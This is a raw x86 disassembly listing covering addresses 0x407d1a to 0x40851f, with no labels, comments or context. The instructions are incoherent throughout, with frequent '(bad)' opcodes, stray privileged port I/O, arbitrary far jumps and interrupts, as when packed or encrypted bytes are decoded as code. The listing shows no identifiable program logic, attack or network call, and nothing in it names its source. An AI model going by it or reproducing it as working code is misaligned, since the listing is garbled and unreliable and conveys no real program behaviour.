  407d1a:	xor    bh,BYTE PTR [esi+0x4]
  407d1d:	mov    dl,0xb6
  407d1f:	sbb    eax,0x127a4e95
  407d24:	jb     0x407d8a
  407d26:	xchg   esi,eax
  407d27:	xchg   esp,eax
  407d28:	popf   
  407d29:	xor    cl,BYTE PTR [ebx+0x1fd20b63]
  407d2f:	rol    DWORD PTR [esi+0x1b],cl
  407d32:	inc    ecx
  407d33:	push   ss
  407d34:	pop    esi
  407d35:	cmp    edi,0x8f489543
  407d3b:	out    dx,eax
  407d3c:	daa    
  407d3d:	int3   
  407d3e:	es mov ecx,0x9daeef3
  407d44:	test   cl,0x58
  407d47:	push   0xffffffee
  407d49:	arpl   bx,di
  407d4b:	jb     0x407d7e
  407d4d:	pushf  
  407d4e:	mov    ebp,0xa054e7f9
  407d53:	aaa    
  407d54:	jb     0x407cf7
  407d56:	ret    0xa8e8
  407d59:	jecxz  0x407dc3
  407d5b:	xchg   edi,eax
  407d5c:	(bad)  
  407d5d:	into   
  407d5e:	push   eax
  407d5f:	loop   0x407d41
  407d61:	int3   
  407d62:	cmp    bh,dh
  407d64:	int    0x21
  407d66:	mov    ah,0x90
  407d68:	and    esi,DWORD PTR [ebp+0x30a22cf3]
  407d6e:	mov    esi,DWORD PTR [ebp+0x55]
  407d71:	sbb    DWORD PTR [eax+0x41],0xffffffc5
  407d75:	cmc    
  407d76:	jecxz  0x407d44
  407d78:	push   es
  407d79:	xchg   edx,eax
  407d7a:	sub    bh,dh
  407d7c:	les    esp,FWORD PTR [ecx+0x66]
  407d7f:	test   BYTE PTR [esi+0x15f6dff],dl
  407d85:	sub    al,0x25
  407d87:	mov    eax,0x71118797
  407d8c:	shl    BYTE PTR [ebp+edx*1+0x1317daac],0xc6
  407d94:	fsubr  DWORD PTR [edi+edi*4-0x43594359]
  407d9b:	xlat   BYTE PTR es:[ebx]
  407d9d:	ins    BYTE PTR es:[edi],dx
  407d9e:	test   eax,0xaf2195e9
  407da3:	sub    DWORD PTR gs:0x97deae64,edi
  407daa:	xor    eax,edx
  407dac:	xchg   ebp,eax
  407dad:	cmp    eax,0x5a7b2806
  407db2:	jmp    0x2c1f:0x392f24cf
  407db9:	(bad)  
  407dbb:	loop   0x407d83
  407dbd:	cmp    DWORD PTR [ebx-0x74afc1a7],edx
  407dc3:	lods   eax,DWORD PTR ds:[esi]
  407dc4:	mov    ds:0xfd913e8a,al
  407dc9:	mov    eax,0xbe22321b
  407dce:	sbb    ecx,DWORD PTR [ebp+0x7889b7e9]
  407dd4:	and    eax,0xe234445
  407dd9:	icebp  
  407dda:	test   eax,0x96233c1f
  407ddf:	sahf   
  407de0:	mov    edx,0xd8871c17
  407de5:	and    eax,0x3770287f
  407dea:	xchg   esi,eax
  407deb:	jp     0x407e26
  407ded:	jns    0x407e5a
  407def:	jg     0x407e1d
  407df1:	jmp    0xa63e:0x6f81ed89
  407df8:	adc    BYTE PTR [esi+0x5e],dl
  407dfb:	xor    eax,0x818fa374
  407e00:	pusha  
  407e01:	fisttp DWORD PTR [eax]
  407e03:	(bad)  
  407e04:	imul   esi,ebx,0x9c3347d7
  407e0a:	lea    edi,[ebx-0x7b]
  407e0d:	pop    edx
  407e0e:	adc    eax,0xfafb6801
  407e13:	mov    ds:0x6bc42324,al
  407e18:	lahf   
  407e19:	or     ah,BYTE PTR fs:[esi+0x3081886b]
  407e20:	sub    DWORD PTR [ebx+0x768ba63],edi
  407e26:	int    0xa5
  407e28:	fdivp  st(3),st
  407e2a:	not    DWORD PTR [ecx-0x2db772f3]
  407e30:	sbb    bl,dh
  407e32:	add    BYTE PTR [ebp-0x24750ad4],0x44
  407e39:	pop    edi
  407e3a:	fisub  WORD PTR [eax+0x77]
  407e3d:	(bad)  
  407e3e:	xchg   esp,eax
  407e3f:	sti    
  407e40:	ret    
  407e41:	mov    esi,0x7c8057e2
  407e46:	cmp    al,0x49
  407e48:	aas    
  407e49:	neg    DWORD PTR [ebp-0x17549b7d]
  407e4f:	mov    eax,0x7b25183d
  407e54:	mov    cl,0xb1
  407e56:	out    dx,al
  407e57:	ret    
  407e58:	xchg   ebp,eax
  407e59:	leave  
  407e5a:	cmp    bp,bp
  407e5d:	pop    ebp
  407e5e:	out    dx,eax
  407e5f:	push   esi
  407e60:	adc    BYTE PTR [eax],bh
  407e62:	dec    eax
  407e63:	push   ss
  407e64:	clc    
  407e65:	pop    ecx
  407e66:	jle    0x407ebd
  407e68:	xor    eax,0xa1aa6a18
  407e6d:	xor    BYTE PTR [esi+0x335fc2c7],cl
  407e73:	inc    edx
  407e74:	and    al,BYTE PTR [esi]
  407e76:	mov    ebx,0xc0ed401c
  407e7b:	xchg   DWORD PTR [esi+0x5dbe6e19],ebx
  407e81:	loopne 0x407ec3
  407e83:	and    BYTE PTR [ebx],bh
  407e85:	add    ebp,DWORD PTR [esp+edx*4]
  407e88:	popf   
  407e89:	pop    eax
  407e8a:	int    0xe8
  407e8c:	mov    ds,WORD PTR [edi]
  407e8e:	jmp    ecx
  407e90:	test   eax,0x7345fed0
  407e95:	mov    ds,WORD PTR [edx]
  407e97:	js     0x407e9b
  407e99:	sbb    al,0xd1
  407e9b:	fnsave [edx]
  407e9d:	test   DWORD PTR [esi+0x3b],edi
  407ea0:	int    0xc4
  407ea2:	fisttp QWORD PTR [ecx-0x683dfb19]
  407ea8:	lahf   
  407ea9:	bound  edx,QWORD PTR [edx-0x6d]
  407eac:	jb     0x407e92
  407eae:	mov    ah,0x49
  407eb0:	fwait
  407eb1:	mov    cs,WORD PTR [edx+0x727d6c6]
  407eb7:	cli    
  407eb8:	pop    ebx
  407eb9:	xchg   ecx,eax
  407eba:	jne    0x407f16
  407ebc:	sub    ah,ch
  407ebe:	push   ds
  407ebf:	push   0x59c2e1
  407ec4:	xchg   edx,eax
  407ec5:	loopne 0x407e6b
  407ec7:	or     eax,0xdecec190
  407ecc:	ins    DWORD PTR es:[edi],dx
  407ecd:	sub    bh,BYTE PTR [edi]
  407ecf:	jnp    0x407e53
  407ed1:	in     al,0x1b
  407ed3:	loope  0x407ebb
  407ed5:	adc    al,0x45
  407ed7:	adc    cl,dl
  407ed9:	shr    BYTE PTR [edi-0x21],1
  407edc:	dec    esi
  407edd:	mov    bh,0x3e
  407edf:	ins    DWORD PTR es:[edi],dx
  407ee0:	push   ds
  407ee1:	div    BYTE PTR [edi]
  407ee3:	mov    ecx,eax
  407ee5:	mov    edi,0xfe33baed
  407eea:	push   0xf1d4e8b5
  407eef:	pop    ebp
  407ef0:	push   cs
  407ef1:	or     al,0xdb
  407ef3:	(bad)  
  407ef4:	cmp    DWORD PTR [eax+0x2],edx
  407ef7:	mov    ebx,0xdd8f58b2
  407efc:	mov    dl,BYTE PTR [eax]
  407efe:	lds    eax,FWORD PTR [ebx+0x31]
  407f01:	pop    ds
  407f02:	outs   dx,DWORD PTR ds:[esi]
  407f03:	ret    0xb5ed
  407f06:	add    BYTE PTR [eax+ebx*1-0x6eeac1fa],dl
  407f0d:	cdq    
  407f0e:	dec    edi
  407f0f:	bt     DWORD PTR [ebp-0x29a778cc],esi
  407f16:	inc    ecx
  407f17:	pushf  
  407f18:	pop    ebp
  407f19:	cs jecxz 0x407f5a
  407f1c:	adc    DWORD PTR [edx-0x2c],ebp
  407f1f:	xchg   ebp,eax
  407f20:	sub    BYTE PTR [eax],dl
  407f22:	pop    esp
  407f23:	cmp    al,0x1b
  407f25:	fdiv   DWORD PTR [esi-0x1a]
  407f28:	call   0x8361e11d
  407f2d:	fs mov ebx,0x22fd31b8
  407f33:	(bad)
  407f36:	cmp    bl,BYTE PTR [esi]
  407f38:	in     al,0x59
  407f3a:	sub    BYTE PTR [eax+0x1d],bl
  407f3d:	les    ebx,FWORD PTR [ebx]
  407f3f:	or     bh,ah
  407f41:	pop    ebx
  407f42:	mov    dh,0xe9
  407f44:	mov    cl,0xb2
  407f46:	ds bnd jl 0x407f77
  407f4a:	pop    ebx
  407f4b:	xchg   DWORD PTR [edi-0x41bc8551],edi
  407f51:	mov    ebp,0x9a7f0557
  407f56:	cmp    ebx,DWORD PTR [edi]
  407f58:	jl     0x407f6a
  407f5a:	ror    DWORD PTR ds:0x6fb43dba,cl
  407f60:	inc    edx
  407f61:	iret   
  407f62:	mov    ds:0x61e49a0,al
  407f67:	mov    bh,bh
  407f69:	call   DWORD PTR [ebx+0x60]
  407f6c:	dec    ecx
  407f6d:	mov    al,0x29
  407f6f:	loope  0x407f01
  407f71:	sub    al,0x0
  407f73:	jae    0x407fc6
  407f75:	push   ebp
  407f76:	jae    0x407f13
  407f78:	sar    DWORD PTR [edx+0x7c],cl
  407f7b:	popf   
  407f7c:	in     al,dx
  407f7d:	dec    edx
  407f7e:	mov    WORD PTR [esi+0x32],ds
  407f81:	loopne 0x407f9b
  407f83:	out    0x21,eax
  407f85:	icebp  
  407f86:	push   esi
  407f87:	ds pop eax
  407f89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407f8a:	add    edx,edi
  407f8c:	mov    dl,0x95
  407f8e:	sub    al,BYTE PTR [edx-0x516bf948]
  407f94:	inc    ebp
  407f95:	push   edi
  407f96:	jmp    0x407f3a
  407f98:	dec    esp
  407f99:	dec    ebp
  407f9a:	call   0xeb513f1e
  407f9f:	jno    0x407f7e
  407fa1:	mov    esi,0xf01a90d0
  407fa6:	dec    edi
  407fa7:	aas    
  407fa8:	lods   al,BYTE PTR ds:[esi]
  407fa9:	xor    DWORD PTR [ecx+ecx*8+0xb],0xffffffbd
  407fae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407faf:	add    edx,DWORD PTR [ebp-0x7338ec53]
  407fb5:	fnstenv [ecx-0x11]
  407fb8:	pop    eax
  407fb9:	fwait
  407fba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407fbb:	xor    ebx,DWORD PTR [edi]
  407fbd:	fwait
  407fbe:	js     0x407fbd
  407fc0:	mov    esi,0xc06510ab
  407fc5:	push   esp
  407fc6:	cmp    eax,0x8cb9e6e7
  407fcb:	inc    ecx
  407fcc:	hlt    
  407fcd:	sti    
  407fce:	adc    ch,BYTE PTR [edi]
  407fd0:	pop    eax
  407fd1:	int    0xe3
  407fd3:	aas    
  407fd4:	int    0x98
  407fd6:	jae    0x408004
  407fd8:	lock popf 
  407fda:	xor    al,BYTE PTR [edx-0x7]
  407fdd:	jae    0x407fbc
  407fdf:	inc    edi
  407fe0:	mov    esi,0x517be37a
  407fe5:	cmp    eax,0xaacd4e80
  407fea:	arpl   WORD PTR [ecx+0x35],si
  407fed:	adc    BYTE PTR [edi-0x19],bl
  407ff0:	repnz clc 
  407ff2:	inc    eax
  407ff3:	inc    edi
  407ff4:	fwait
  407ff5:	(bad)  
  407ff6:	pop    ds
  407ff7:	loop   0x407f99
  407ff9:	ja     0x408046
  407ffb:	loope  0x407fe5
  407ffd:	fmul   st(5),st
  407fff:	inc    ecx
  408000:	sub    edx,esi
  408002:	mov    ebp,fs
  408004:	aas    
  408005:	jmp    0x407f88
  408007:	cmp    al,0x9c
  408009:	dec    ebp
  40800a:	and    eax,0x47ccc488
  40800f:	repz rcl BYTE PTR [ecx],cl
  408012:	lea    esi,[edx+0x9ca0cc5]
  408018:	pop    es
  408019:	out    0xe0,al
  40801b:	hlt    
  40801c:	loope  0x407fca
  40801e:	inc    esp
  40801f:	stos   BYTE PTR es:[edi],al
  408020:	(bad)  
  408021:	mov    BYTE PTR [esi-0x5f7fb27e],bl
  408027:	pushf  
  408028:	and    dl,cl
  40802a:	or     BYTE PTR [edx],ah
  40802c:	in     al,dx
  40802d:	add    eax,0xb7891a39
  408032:	adc    BYTE PTR [eax],cl
  408034:	and    eax,0xac442322
  408039:	sbb    DWORD PTR [esi-0x17ca3010],ebp
  40803f:	jp     0x40802b
  408041:	mov    eax,0xe3522d77
  408046:	xor    eax,0x8417620b
  40804b:	int3   
  40804c:	call   0x2558:0xdcb23833
  408053:	ret    
  408054:	loopne 0x4080a4
  408056:	jae    0x407fe3
  408058:	int    0x8f
  40805a:	pop    edi
  40805b:	mov    ds:0x1a09e18,al
  408060:	out    dx,eax
  408061:	icebp  
  408062:	repnz in eax,dx
  408064:	(bad)  
  408065:	dec    DWORD PTR [edx+0x62]
  408068:	ror    DWORD PTR [esi+0xa],0x8e
  40806c:	js     0x408003
  40806e:	test   DWORD PTR ds:0xe0bd0af8,edi
  408074:	xor    eax,0x507dd7d9
  408079:	xor    al,0x64
  40807b:	loop   0x408054
  40807d:	ja     0x408052
  40807f:	xor    dl,BYTE PTR [edx-0x7dbf6da0]
  408085:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408086:	sub    bh,al
  408088:	leave  
  408089:	pusha  
  40808a:	xchg   esi,eax
  40808b:	out    dx,eax
  40808c:	dec    esi
  40808d:	push   edx
  40808e:	adc    eax,0xef06a5f7
  408093:	mov    DWORD PTR [edi+0x6781d805],esp
  408099:	fcomip st,st(1)
  40809b:	sbb    eax,0x302d479d
  4080a0:	test   al,0xda
  4080a2:	aaa    
  4080a3:	out    dx,eax
  4080a4:	(bad)  
  4080a5:	fdivr  st,st(1)
  4080a7:	out    0x65,eax
  4080a9:	loopne 0x408090
  4080ab:	push   eax
  4080ac:	in     al,dx
  4080ad:	scas   eax,DWORD PTR es:[edi]
  4080ae:	cmp    ebx,ebx
  4080b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080b1:	cmc    
  4080b2:	les    ebp,FWORD PTR es:[eax+0xec9af98]
  4080b9:	adc    esp,DWORD PTR [eax]
  4080bb:	loope  0x408071
  4080bd:	add    DWORD PTR [ecx+eax*4],0x9d8e1592
  4080c4:	in     al,dx
  4080c5:	data16 mov BYTE PTR [eax+0x1d],cl
  4080c9:	repnz pop esp
  4080cb:	inc    ebx
  4080cc:	sar    DWORD PTR [edx+0x74],1
  4080cf:	and    DWORD PTR [ebx+0x3f2c547f],esi
  4080d5:	mov    al,0x21
  4080d7:	mov    ebp,0xcb2b2a9b
  4080dc:	xchg   ecx,eax
  4080dd:	jae    0x40812b
  4080df:	adc    DWORD PTR [ebp-0x6954ffc4],esi
  4080e5:	addr16 add eax,0x694e51e3
  4080eb:	imul   ebp,DWORD PTR [ecx],0xffffffce
  4080ee:	inc    ecx
  4080ef:	adc    DWORD PTR [ecx],edi
  4080f1:	or     DWORD PTR [ecx-0x36],eax
  4080f4:	xor    BYTE PTR [eax],ah
  4080f6:	(bad)  
  4080f7:	outs   dx,BYTE PTR ds:[esi]
  4080f8:	aam    0x3b
  4080fa:	cmp    al,0x9
  4080fc:	xchg   DWORD PTR [edx],esi
  4080fe:	ins    BYTE PTR es:[edi],dx
  4080ff:	add    bh,BYTE PTR [ebx-0x4e]
  408102:	cdq    
  408103:	and    eax,0x18294e78
  408108:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408109:	out    0x3f,ax
  40810c:	ins    DWORD PTR es:[edi],dx
  40810d:	jb     0x408146
  40810f:	into   
  408110:	loope  0x408178
  408112:	or     ecx,DWORD PTR [esi]
  408114:	retf   
  408115:	add    DWORD PTR [edx],edi
  408117:	push   eax
  408118:	popa   
  408119:	ss imul esp,ebp,0xffffffb9
  40811d:	mov    edx,0x7cbd1435
  408122:	(bad)
  408126:	fild   DWORD PTR [ecx+0x44]
  408129:	ret    
  40812a:	push   0x46
  40812c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40812d:	inc    edx
  40812e:	call   0x7b39b81f
  408133:	mov    al,cs:0xe4476157
  408139:	adc    esi,0x29
  40813c:	mov    ebp,0xef7dba3a
  408141:	rcl    DWORD PTR [ecx],cl
  408143:	jge    0x4081a1
  408145:	ins    DWORD PTR es:[edi],dx
  408146:	dec    esp
  408147:	cmp    edx,DWORD PTR [edi+0x2]
  40814a:	sub    al,0x80
  40814c:	xor    edx,DWORD PTR [ebx+ebx*2-0x33]
  408150:	inc    ecx
  408151:	popf   
  408152:	iret   
  408153:	iret   
  408154:	mov    WORD PTR [esi+0x261c2c75],?
  40815a:	sub    ecx,DWORD PTR ds:0x50985502
  408160:	ret    0xfed7
  408163:	sub    DWORD PTR [ecx+ecx*4-0x53],esi
  408167:	dec    esi
  408168:	out    0x97,al
  40816a:	bound  ecx,QWORD PTR [eax]
  40816c:	sub    al,0x19
  40816e:	add    ebp,edx
  408170:	mov    dh,0xc0
  408172:	pusha  
  408173:	scas   al,BYTE PTR es:[edi]
  408174:	xchg   esp,eax
  408175:	in     eax,dx
  408176:	push   ss
  408177:	xchg   esp,eax
  408178:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408179:	call   0x6dce:0x548a02c6
  408180:	mov    ah,BYTE PTR [ebx]
  408182:	mov    dl,0xe1
  408184:	adc    DWORD PTR [esi-0x2abeba32],edx
  40818a:	ds push es
  40818c:	pop    esi
  40818d:	xor    eax,ebx
  40818f:	cli    
  408190:	mov    eax,DWORD PTR [edx+0x3e00d483]
  408196:	outs   dx,DWORD PTR ds:[esi]
  408197:	inc    ebp
  408198:	out    0x4b,eax
  40819a:	sub    DWORD PTR [esi+0x59],ebp
  40819d:	pop    es
  40819e:	jnp    0x4081a3
  4081a0:	clc    
  4081a1:	addr16 adc al,0x1e
  4081a4:	fistp  DWORD PTR [ecx-0x25]
  4081a7:	mov    edi,0x2de66735
  4081ac:	test   DWORD PTR [edx+0x4d7eb0a9],edi
  4081b2:	pop    es
  4081b3:	jg     0x4081e5
  4081b5:	ss (bad) 
  4081b7:	push   eax
  4081b8:	push   ss
  4081b9:	fcos   
  4081bb:	mov    bl,0x67
  4081bd:	mov    esi,0x9a768a08
  4081c2:	sahf   
  4081c3:	nop
  4081c4:	je     0x408183
  4081c6:	mov    ds:0xb44e906f,al
  4081cb:	mov    ebp,0x3aee407
  4081d0:	fimul  DWORD PTR [edi-0x26]
  4081d3:	dec    edi
  4081d4:	xor    eax,0xc0615def
  4081d9:	fwait
  4081da:	pop    ebx
  4081db:	cmp    DWORD PTR [edx],edx
  4081dd:	ins    BYTE PTR es:[edi],dx
  4081de:	xchg   ecx,eax
  4081df:	jg     0x408259
  4081e1:	neg    DWORD PTR [edi-0x49ff574]
  4081e7:	dec    eax
  4081e8:	scas   eax,DWORD PTR es:[edi]
  4081e9:	mov    bh,0x7d
  4081eb:	loop   0x4081ec
  4081ed:	push   0x710c3042
  4081f2:	jmp    0x40825f
  4081f4:	loope  0x408256
  4081f6:	fnstsw WORD PTR ds:0xe8b8f858
  4081fc:	add    eax,0x1fc3199e
  408201:	mov    ebx,0x4df56968
  408206:	out    dx,al
  408207:	test   DWORD PTR [ebp-0x12],esi
  40820a:	imul   ecx,DWORD PTR [esi+0x2cf73654],0xc2b45f2
  408214:	dec    ecx
  408215:	jmp    0x6ebc:0x68029687
  40821c:	sub    BYTE PTR [esi+0x78],bl
  40821f:	dec    ecx
  408220:	pop    ds
  408221:	aam    0x6a
  408223:	xchg   BYTE PTR [edi+0x1d],dh
  408226:	jle    0x40828d
  408228:	adc    bl,BYTE PTR [eax-0x7d]
  40822b:	fld    TBYTE PTR [esi+0xa]
  40822e:	or     DWORD PTR [ebp+0x5a],edx
  408231:	rcr    BYTE PTR [edi+0x4a9b0dcf],1
  408237:	fdiv   QWORD PTR [ecx+0x7f4c86e5]
  40823d:	dec    eax
  40823e:	and    DWORD PTR [edx-0x3c],edx
  408241:	jp     0x408297
  408243:	fdivr  st,st(1)
  408245:	mov    al,0x7d
  408247:	sbb    DWORD PTR [edx+0x70a1726e],0x4b0c03ed
  408251:	mov    edx,0x5511bd77
  408256:	test   ecx,ebx
  408258:	fistp  QWORD PTR [edx-0x4]
  40825b:	jg     0x4082a5
  40825d:	test   al,0xb9
  40825f:	or     dh,dl
  408261:	add    BYTE PTR [ebx+eax*4+0x3872efbf],cl
  408268:	test   al,0xa8
  40826a:	aad    0x69
  40826c:	mov    edi,0x1d4032f8
  408271:	popa   
  408272:	and    DWORD PTR [eax],esp
  408274:	mov    ebp,0x381a0d1a
  408279:	xor    al,BYTE PTR [edi+esi*8-0x64c10612]
  408280:	xchg   BYTE PTR [ecx],ch
  408282:	push   eax
  408283:	mov    eax,ds:0xe4ff5abf
  408288:	test   al,0x7c
  40828a:	call   0x9b6b:0xfc934a20
  408291:	sbb    dl,BYTE PTR ds:0x1db8330d
  408297:	inc    esi
  408298:	fsubr  st(7),st
  40829a:	rcr    edi,0xa8
  40829d:	or     DWORD PTR [edx+ecx*8-0xcb14eb8],edi
  4082a4:	or     BYTE PTR ds:[esi-0x50],ah
  4082a8:	fsubr  QWORD PTR [eax]
  4082aa:	mov    ch,0xb4
  4082ac:	xor    BYTE PTR [ebx+0x1f9e588d],0x88
  4082b3:	cmp    al,0xae
  4082b5:	ret    0xd1
  4082b8:	sbb    al,0xc6
  4082ba:	jno    0x4082ac
  4082bc:	lds    ecx,FWORD PTR [ebp-0x68]
  4082bf:	sub    BYTE PTR [edx],cl
  4082c1:	sbb    eax,0x41a47f54
  4082c6:	xchg   esp,eax
  4082c7:	dec    esi
  4082c8:	outs   dx,BYTE PTR ds:[esi]
  4082c9:	fs jge 0x40829a
  4082cc:	cmc    
  4082cd:	jmp    0x408334
  4082cf:	mov    ebp,0xa61c4d5f
  4082d4:	fldenv es:[esp+ecx*1-0x421670d0]
  4082dc:	and    esp,ebx
  4082de:	aad    0x33
  4082e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082e1:	xor    DWORD PTR [ecx-0x2a],ebp
  4082e4:	inc    esp
  4082e5:	inc    ecx
  4082e6:	imul   edi,ebx,0xffffffa6
  4082e9:	xor    al,0x92
  4082eb:	gs jnp 0x4082a0
  4082ee:	sbb    BYTE PTR [ecx-0xb],cl
  4082f1:	sbb    ebx,DWORD PTR ds:[ebx]
  4082f4:	cld    
  4082f5:	iret   
  4082f6:	lock add BYTE PTR [eax+0x63],al
  4082fa:	pop    ebx
  4082fb:	mov    DWORD PTR [edi],ebp
  4082fd:	ds jbe 0x4082fd
  408300:	adc    DWORD PTR [eax-0x27],ecx
  408303:	mov    al,ds:0x76827304
  408308:	sub    DWORD PTR [ecx+0x7b],ebp
  40830b:	outs   dx,DWORD PTR ds:[esi]
  40830c:	cmp    edx,edi
  40830e:	cdq    
  40830f:	lock cld 
  408311:	lods   eax,DWORD PTR ds:[esi]
  408312:	out    dx,al
  408313:	fnstcw WORD PTR [esi+ebp*1-0x6afa99b5]
  40831a:	loopne 0x4082f5
  40831c:	ror    BYTE PTR [edx-0x32],0x6c
  408320:	xchg   BYTE PTR [esi+ebx*4+0x6],ch
  408324:	or     eax,0x543baa38
  408329:	test   BYTE PTR [ebx],ch
  40832b:	jp     0x4082d7
  40832d:	je     0x4082d6
  40832f:	sbb    ebp,DWORD PTR [edx-0x4a]
  408332:	mov    ds:0x61d3b412,eax
  408337:	(bad)  
  408338:	dec    edi
  408339:	xchg   ecx,eax
  40833a:	inc    eax
  40833b:	pop    ds
  40833c:	sbb    eax,0x68cb9d95
  408341:	mov    eax,DWORD PTR [edx-0x53828b8f]
  408347:	dec    ecx
  408348:	aam    0x47
  40834a:	jne    0x408371
  40834c:	push   ds
  40834d:	xchg   DWORD PTR [ecx+0x76],eax
  408350:	not    DWORD PTR [ebx]
  408352:	(bad)  
  408353:	outs   dx,DWORD PTR ds:[esi]
  408354:	jb     0x4083c1
  408356:	aad    0x3f
  408358:	cmovns edx,DWORD PTR [edi+0x34]
  40835c:	mov    eax,0xf609fddf
  408361:	dec    edi
  408362:	push   ds
  408363:	lods   al,BYTE PTR ds:[esi]
  408364:	mov    esi,0xc959649b
  408369:	mov    eax,ds:0x2ad42b5d
  40836e:	sub    eax,0xd3ea05b9
  408373:	and    eax,0x3ea14146
  408378:	sbb    BYTE PTR [esi],al
  40837a:	rcl    dh,cl
  40837c:	std    
  40837d:	cdq    
  40837e:	(bad)  
  40837f:	adc    BYTE PTR [ecx],dl
  408381:	pop    es
  408382:	sti    
  408383:	ficom  DWORD PTR [ecx+0x7f996bda]
  408389:	mov    ecx,0x42ce0003
  40838e:	xor    cl,dl
  408390:	shl    DWORD PTR [ebx+0x37],cl
  408393:	push   edx
  408394:	mov    eax,0xda27b020
  408399:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40839a:	push   esp
  40839b:	stos   DWORD PTR es:[edi],eax
  40839c:	add    eax,0x6f9c91af
  4083a1:	xor    ch,bh
  4083a3:	ds mov dh,0xa8
  4083a6:	shr    BYTE PTR [edi-0x5290e6ee],cl
  4083ac:	and    dh,BYTE PTR [esi-0x10]
  4083af:	add    al,0x2
  4083b1:	cwde   
  4083b2:	or     DWORD PTR [ecx-0x5cf6bd31],0x26c2e541
  4083bc:	(bad)  
  4083bd:	imul   BYTE PTR [esi]
  4083bf:	popf   
  4083c0:	mov    dl,0xcc
  4083c2:	je     0x40836d
  4083c4:	add    BYTE PTR [eax],bh
  4083c6:	jmp    0x408436
  4083c8:	mov    ah,0xa
  4083ca:	into   
  4083cb:	xor    esp,DWORD PTR [ebx+eax*2]
  4083ce:	fdivr  st,st(5)
  4083d0:	lds    ebp,FWORD PTR [ecx]
  4083d2:	adc    al,0x7b
  4083d4:	add    esi,DWORD PTR [ecx-0x30]
  4083d7:	iret   
  4083d8:	pop    ecx
  4083d9:	clc    
  4083da:	das    
  4083db:	ss cdq 
  4083dd:	sub    eax,0x46660a5b
  4083e2:	test   dh,ah
  4083e4:	rcl    DWORD PTR [ecx+0x48],cl
  4083e7:	imul   DWORD PTR [edx-0x6cae21c8]
  4083ed:	sub    BYTE PTR [ebx],dh
  4083ef:	jne    0x408388
  4083f1:	jmp    0xa5aa:0xa9c7b8cd
  4083f8:	or     ebp,eax
  4083fa:	je     0x4083f3
  4083fc:	gs loop 0x40842e
  4083ff:	add    bl,al
  408401:	dec    ebx
  408402:	retf   0x13c0
  408405:	pop    ebp
  408406:	sbb    eax,0xf32ddb8e
  40840b:	scas   eax,DWORD PTR es:[edi]
  40840c:	ss arpl ax,sp
  40840f:	add    BYTE PTR [edx-0x43b1520f],0xc0
  408416:	cmp    bl,BYTE PTR [esp+ebp*2+0x45e16cdf]
  40841d:	push   edx
  40841e:	add    ebp,ecx
  408420:	daa    
  408421:	or     eax,0xd5f1536d
  408426:	ret    0xf625
  408429:	mov    ecx,0x64ab2185
  40842e:	in     eax,dx
  40842f:	icebp  
  408430:	int    0x1
  408432:	rcr    DWORD PTR [edx-0x3f4af170],1
  408438:	stos   BYTE PTR es:[edi],al
  408439:	outs   dx,DWORD PTR ds:[esi]
  40843a:	inc    esp
  40843b:	adc    al,0xea
  40843d:	adc    BYTE PTR [ebp+eax*4-0x610fd003],ah
  408444:	mov    esi,0xbff7ae53
  408449:	push   ds
  40844a:	(bad)  
  40844b:	in     al,dx
  40844c:	jmp    0xefd8:0xa29b52a2
  408453:	mov    ds:0x37f87254,al
  408458:	and    BYTE PTR [ecx-0x7c],cl
  40845b:	stos   BYTE PTR es:[edi],al
  40845c:	mov    edx,0xd0b2e081
  408461:	jb     0x408465
  408463:	xor    ecx,DWORD PTR [ebx-0x16]
  408466:	adc    dh,BYTE PTR [ecx+0x662e60ae]
  40846c:	test   dh,cl
  40846e:	xchg   esp,eax
  40846f:	sbb    BYTE PTR [ecx],0xc9
  408472:	sbb    al,0x91
  408474:	pop    edx
  408475:	outs   dx,BYTE PTR ds:[esi]
  408476:	xchg   esp,eax
  408477:	bound  edx,QWORD PTR [eax-0xb]
  40847a:	mov    cl,0x87
  40847c:	mov    eax,ds:0xaeff144
  408481:	stc    
  408482:	push   0x77
  408484:	mov    bh,0x22
  408486:	clc    
  408487:	xchg   ebp,eax
  408488:	dec    ebp
  408489:	clc    
  40848a:	fisubr DWORD PTR [edi+0x13]
  40848d:	stc    
  40848e:	xor    edx,DWORD PTR [esi-0x71]
  408491:	hlt    
  408492:	in     al,0x86
  408494:	int3   
  408495:	enter  0x85ed,0x44
  408499:	and    al,BYTE PTR [ebx+esi*8+0x7fa523e3]
  4084a0:	and    DWORD PTR [edi+0x3c],esi
  4084a3:	out    0xb9,eax
  4084a5:	sbb    BYTE PTR [ebx+ecx*4-0x103f4f39],bl
  4084ac:	int    0xc8
  4084ae:	lods   al,BYTE PTR ds:[esi]
  4084af:	push   0xfa63fe60
  4084b4:	fcomi  st,st(5)
  4084b6:	pushf  
  4084b7:	mov    edi,0xf4cac1d3
  4084bc:	repz repnz pop ebp
  4084bf:	sahf   
  4084c0:	ja     0x408470
  4084c2:	stos   DWORD PTR es:[edi],eax
  4084c3:	pop    eax
  4084c4:	and    DWORD PTR [ecx+0x76e0d328],eax
  4084ca:	dec    esp
  4084cc:	fild   WORD PTR [esi+edi*2]
  4084cf:	push   ebx
  4084d0:	(bad)  
  4084d1:	jle    0x408519
  4084d3:	mov    edx,0xab392345
  4084d8:	sub    eax,DWORD PTR [ebx+0x4887b66c]
  4084de:	nop
  4084df:	test   BYTE PTR [esi+0x483e7fa1],dh
  4084e5:	fidiv  DWORD PTR [esi-0x4]
  4084e8:	jno    0x4084fc
  4084ea:	cmp    BYTE PTR cs:[edx],al
  4084ed:	ds out 0xc4,al
  4084f0:	lods   eax,DWORD PTR ds:[esi]
  4084f1:	cmp    eax,0x6ffd4457
  4084f6:	mov    cl,0xcc
  4084f8:	imul   esp,DWORD PTR es:[edi],0x6caa1ab4
  4084ff:	lods   eax,DWORD PTR ds:[esi]
  408500:	cs jmp 0xdc1a:0xf8850573
  408508:	int    0x81
  40850a:	shl    BYTE PTR [esi-0x286bcca5],1
  408510:	jns    0x408564
  408512:	push   ebp
  408513:	push   ss
  408514:	mov    ds:0x870d706a,al
  408519:	sub    DWORD PTR [ebp+0x7e5f05a7],ebx
  40851f:	in     eax,0x7a
